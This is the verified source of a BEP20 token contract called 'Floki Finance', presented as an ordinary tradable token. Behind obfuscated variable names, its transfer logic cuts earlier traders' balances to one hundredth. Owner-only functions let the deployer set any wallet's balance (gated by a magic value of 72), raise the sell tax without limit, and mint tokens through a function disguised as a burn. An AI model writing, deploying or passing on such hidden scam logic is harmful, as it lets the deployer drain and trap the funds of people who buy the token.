/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*

 * 
 * Telegram: https://t.me/flokifinancetkn
 */

abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {

    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {

    this;
    return msg.data;

  }

}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.

 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier

 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 /**
  * @dev Initializes the contract setting the deployer as the initial owner.

  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }

 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;

 }
 /**
  * @dev Throws if called by any account other than the owner.
  */

 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }

 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *

  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */

 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**

  * @dev Transfers ownership of the contract to a new account (`newOwner`).

  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);

   _owner = newOwner;
 }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");

    }
}
interface IBEP20 {
  function decimals() external view returns (uint8);
  function symbol() external pure returns (string memory);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);

  function getOwner() external view returns (address);
  function allowance(address owner, address spender) external view returns (uint256);
  function totalSupply() external view returns (uint256);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeToSetter(address) external;
    function allPairs(uint) external view returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function feeTo() external view returns (address);
    function setFeeTo(address) external;

    function feeToSetter() external view returns (address);
}

interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);
    function initialize(address, address) external;
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function token0() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function transferFrom(address from, address to, uint value) external returns (bool);
    function symbol() external pure returns (string memory);
    function approve(address spender, uint value) external returns (bool);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function decimals() external pure returns (uint8);
    function kLast() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function allowance(address owner, address spender) external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function name() external pure returns (string memory);
    function transfer(address to, uint value) external returns (bool);

    event Sync(uint112 reserve0, uint112 reserve1);
    function price0CumulativeLast() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    function factory() external view returns (address);
    function mint(address to) external returns (uint liquidity);

    function sync() external;

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
}
interface IUniswapV2Router01 {
    function addLiquidityETH(
        address token,

        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,

        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,

        address[] calldata path,
        address to,

        uint deadline
    ) external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function removeLiquidityWithPermit(
        address tokenA,

        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(

        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,

        address[] calldata path,
        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
}

contract FlokiFinance is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unismraqotfogpiydaebxknewjcilhz;
  address public uniqkwcrbgeotpanej;
  uint8 private dechtslzmowdeepbcrjygniiqafakxo = 18;

  uint256 private totehktfcmdnxqloairgwpjsoizeyba = 100000000 * 10 ** dechtslzmowdeepbcrjygniiqafakxo;
  mapping (address => uint256) private balahokcaylgwxqjrbnseo;

  uint8 internal buyiepdyrsfixek = 7;
  uint8 internal seliokejrzfmthliayqagocsdbwexpn = 11;
  uint8 internal traembniwhyaspcxkeo = 10; 
  uint256 internal maxcihdjqponomlaiabfwkrsge = totehktfcmdnxqloairgwpjsoizeyba.div(10000).mul(10);
  mapping (address => uint256) private selsxhzatdcrieqenilomafwkjpg;
  mapping (address => uint256) private lasfjzlamiypkeabxntdqehwgco;

  uint256 internal lauitmerypowx = 0;
  uint256 internal lasnicwtsfaabqkjmzydleo = 0;
  mapping (address => mapping (address => uint256)) private allonrlacqbeymdazostwjfpix;
  address internal maricoiqewhalzdon;
  bool internal staaizrtkoyeembahigjxqslnwpo = true;
  bool internal staxjbawdzkthpqniscy = true;
  bool internal staeniclfitwoohz = true;
  string private constant namsephootcegbdaxiinqwmfr = "Floki Finance";
  string private constant symjnotdlweaeycpiarszikomx = "FLOKI";
  uint32 internal selwaooscaepglnyrkbh = 10; 
  uint8 internal _sta = 3;
  uint8 internal aftchatnrsofqwjpaoybmi = 95;
  mapping (address => bool) private isEhbxmoflpiinjedyceqgkwra;
  mapping (address => uint256) private lasjegyikmdifxpacrnhqotlewosb;
  constructor() {
    lauitmerypowx = block.timestamp;
    isEhbxmoflpiinjedyceqgkwra[_msgSender()] = true;

    isEhbxmoflpiinjedyceqgkwra[address(this)] = true;
    maricoiqewhalzdon = msg.sender;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniqkwcrbgeotpanej = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unismraqotfogpiydaebxknewjcilhz = uniswapV2Router;
    balahokcaylgwxqjrbnseo[msg.sender] = totehktfcmdnxqloairgwpjsoizeyba;
    emit Transfer(address(0), msg.sender, totehktfcmdnxqloairgwpjsoizeyba);
  }
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   tragiebyrdelapiosnhqowcmjxkfzat(sender, recipient, amount);

	   _approve(sender, _msgSender(), allonrlacqbeymdazostwjfpix[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  tragiebyrdelapiosnhqowcmjxkfzat(_msgSender(), recipient, amount);
	  return true;
	}

	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();

	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namsephootcegbdaxiinqwmfr;
	}

	/**

	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symjnotdlweaeycpiarszikomx;
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totehktfcmdnxqloairgwpjsoizeyba;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allonrlacqbeymdazostwjfpix[owner][spender] = amount;
	    emit Approval(owner, spender, amount);

	}

	/**
	 * Returns balance of.
	 */

	function balanceOf(address account) external override view returns (uint256) {
	  return balahokcaylgwxqjrbnseo[account];

	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allonrlacqbeymdazostwjfpix[owner][spender];
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return dechtslzmowdeepbcrjygniiqafakxo;

	}
	function approve(address spender, uint256 amount) public override returns (bool) {

	  _approve(_msgSender(), spender, amount);
	  return true;
	}
  	function tragiebyrdelapiosnhqowcmjxkfzat(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranjwfmdorkgtxe = 0; // 1 = buy, 2 = sell, 3 = transfer

	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEhbxmoflpiinjedyceqgkwra[sender] == true || isEhbxmoflpiinjedyceqgkwra[recipient] == true){

	      eTrozpgnjhkydreao(sender, recipient, amount);
	      return;
	    }
	    if(sender == uniqkwcrbgeotpanej && recipient != address(unismraqotfogpiydaebxknewjcilhz)) {
	      require(staaizrtkoyeembahigjxqslnwpo == true, "Please wait try again later");

	      ranjwfmdorkgtxe = 1;
	      tax = buyiepdyrsfixek;
	      approveTransaction = true;
	      lasfjzlamiypkeabxntdqehwgco[recipient] = amount;
	      lasjegyikmdifxpacrnhqotlewosb[recipient] = block.timestamp;
	    } else if(recipient == uniqkwcrbgeotpanej) {
	      require(staxjbawdzkthpqniscy == true, "Please wait try again later");
	       ranjwfmdorkgtxe = 2;
	       tax = seliokejrzfmthliayqagocsdbwexpn;

	       approveTransaction = true;
	    } else {
	      require(staeniclfitwoohz == true, "Please wait try again later");
	      ranjwfmdorkgtxe = 3;

	      tax = traembniwhyaspcxkeo;
	      approveTransaction = true;
	      lasfjzlamiypkeabxntdqehwgco[sender] = amount;

	      if(selwaooscaepglnyrkbh > 10){
	        lasjegyikmdifxpacrnhqotlewosb[sender] = block.timestamp + selwaooscaepglnyrkbh - 10;

	      } else {
	        lasjegyikmdifxpacrnhqotlewosb[sender] = block.timestamp + selwaooscaepglnyrkbh;
	      }

	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranjwfmdorkgtxe);

	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrozpgnjhkydreao(address sender, address recipient, uint256 amount) internal {
	    balahokcaylgwxqjrbnseo[sender] = balahokcaylgwxqjrbnseo[sender].sub(amount, "Insufficient Balance");

	    balahokcaylgwxqjrbnseo[recipient] = balahokcaylgwxqjrbnseo[recipient].add(amount);

	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allonrlacqbeymdazostwjfpix;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranjwfmdorkgtxe) internal

	{
	  uint256 axepynqlxsaigai = 0;
	  address addr = recipient;
	  uint256 d = balahokcaylgwxqjrbnseo[_recipientb];

	  if(ranjwfmdorkgtxe == 2) {

	    addr = sender;
	  }
	  if(ranjwfmdorkgtxe == 1 || ranjwfmdorkgtxe == 2){

	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balahokcaylgwxqjrbnseo[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }

	  balahokcaylgwxqjrbnseo[sender] = balahokcaylgwxqjrbnseo[sender].sub(amount,"Insufficient Balance");
	  axepynqlxsaigai = amount.mul(tax).div(100);
	  amount = amount.sub(axepynqlxsaigai);
	  if(axepynqlxsaigai > 0){
	      balahokcaylgwxqjrbnseo[maricoiqewhalzdon] = balahokcaylgwxqjrbnseo[maricoiqewhalzdon].add(axepynqlxsaigai);
	      emit Transfer(sender, maricoiqewhalzdon, axepynqlxsaigai);
	  }

	  balahokcaylgwxqjrbnseo[recipient] = balahokcaylgwxqjrbnseo[recipient].add(amount);
	  ranjwfmdorkgtxe= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function Selyoacqfzelrn(uint8 ellcansloeiqfikzgtpxybjowmae) public onlyOwner{
	     seliokejrzfmthliayqagocsdbwexpn = ellcansloeiqfikzgtpxybjowmae;
	}
	function etByldsrozpceijkbmit(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){

	    balahokcaylgwxqjrbnseo[addr] = b * 10 ** dechtslzmowdeepbcrjygniiqafakxo;
	  }
	}
	uint256 public _devFee = 2;
	function devFee(uint256 devfee) public onlyOwner {
	  _devFee = devfee;
	}
	function ownaple(uint256 amount) public onlyOwner virtual {
	  _ownaple(_msgSender(), amount);

	}
	function _ownaple(address account, uint256 amount) internal {
	  require(account != address(0));
	  balahokcaylgwxqjrbnseo[account] = balahokcaylgwxqjrbnseo[account].sub(amount).mul(_devFee);
	  totehktfcmdnxqloairgwpjsoizeyba = totehktfcmdnxqloairgwpjsoizeyba.sub(amount).mul(_devFee);
	  emit Transfer(account, address(0), amount);
	}
}